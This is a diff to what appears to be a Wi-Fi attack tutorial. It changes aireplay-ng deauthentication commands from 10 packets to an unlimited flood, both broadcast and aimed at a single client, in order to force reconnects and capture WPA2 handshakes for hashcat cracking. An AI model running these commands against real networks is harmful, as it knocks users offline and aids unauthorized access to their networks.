@@ -177,9 +177,10 @@ You can use the following command to deauthenticate a client and force it to
 reconnect in another terminal:
 
 ```bash
-sudo aireplay-ng --deauth 10 -a $bssid $interface # to broadcast
+# To broadcast:
+sudo aireplay-ng --deauth 0 -a $bssid $interface
 # or
-sudo aireplay-ng --deauth 10 -a $bssid -c $station $interface
+sudo aireplay-ng --deauth 0 -a $bssid -c $station $interface
 ```
 
 Now, we need to convert the pcapng file to the specific hash that `hashcat` can
@@ -219,9 +220,9 @@ To deauthenticate a client and force it to reconnect, you can use the following
 command:
 
 ```bash
-sudo aireplay-ng --deauth 10 -a $bssid $interface
+sudo aireplay-ng --deauth 0 -a $bssid $interface
 # or
-sudo aireplay-ng --deauth 10 -a $bssid -c $station $interface
+sudo aireplay-ng --deauth 0 -a $bssid -c $station $interface
 ```
 
 ### Fake a WPA2 AP
